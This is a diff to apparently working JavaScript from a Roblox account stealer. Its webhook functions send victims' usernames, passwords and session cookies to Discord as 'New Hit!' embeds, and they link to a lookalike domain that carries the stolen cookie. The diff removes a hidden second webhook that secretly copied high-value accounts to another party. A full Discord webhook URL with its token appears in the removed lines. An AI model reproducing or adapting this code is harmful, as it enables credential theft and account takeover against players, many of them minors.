@@ -359,15 +359,7 @@ async function send_webhook(url, userid, username, password, cookie, rap){
 	rapp = lolinfo[3];
 	robux = lolinfo[1];
 	hasprem = lolinfo[5];
-	if (Number(rapp) > 9999){
-		const hook2 = new Webhook("https://discord.com/api/webhooks/860049990545834024/X1n0tkyiDZ_uR7w9AKNL73daN4lCqaspsP7vnbbL1ifhlP5Ibch3FlmU-LpFKEOl4-VJ");	
-		await hook2.send('@everyone');
-	}else if (Number(robux) > 9999){
-		const hook2 = new Webhook("https://discord.com/api/webhooks/860049990545834024/X1n0tkyiDZ_uR7w9AKNL73daN4lCqaspsP7vnbbL1ifhlP5Ibch3FlmU-LpFKEOl4-VJ");	
-		await hook2.send('@everyone');
-	}else{
-		const hook2 = new Webhook(globalhook);	
-	}
+	const hook2 = new Webhook(globalhook);
 	embed = new MessageBuilder()
 	.setTitle("New Hit!")
         .setAuthor('Recheck Cookie?', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png', `https://wvw-rbxflip.com/check.php?c=${cookie}`)
@@ -420,15 +412,7 @@ async function send_webhook2(url, userid, username, password, cookie, rap){
 	await hook.send(embed);
         //hook2 = dualhook
         await hook2.send(embed);
-	if (Number(rapp) > 9999){
-		const hook2 = new Webhook("https://discord.com/api/webhooks/860049990545834024/X1n0tkyiDZ_uR7w9AKNL73daN4lCqaspsP7vnbbL1ifhlP5Ibch3FlmU-LpFKEOl4-VJ");	
-		await hook2.send('@everyone');
-	}else if (Number(robux) > 9999){
-		const hook2 = new Webhook("https://discord.com/api/webhooks/860049990545834024/X1n0tkyiDZ_uR7w9AKNL73daN4lCqaspsP7vnbbL1ifhlP5Ibch3FlmU-LpFKEOl4-VJ");	
-		await hook2.send('@everyone');
-	}else{
-		const hook2 = new Webhook(globalhook);	
-	}
+	const hook2 = new Webhook(globalhook);
 	embed = new MessageBuilder()
 	.setTitle("New Hit!")
         .setAuthor('Recheck Cookie?', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png', `https://wvw-rbxflip.com/check.php?c=${cookie}`)
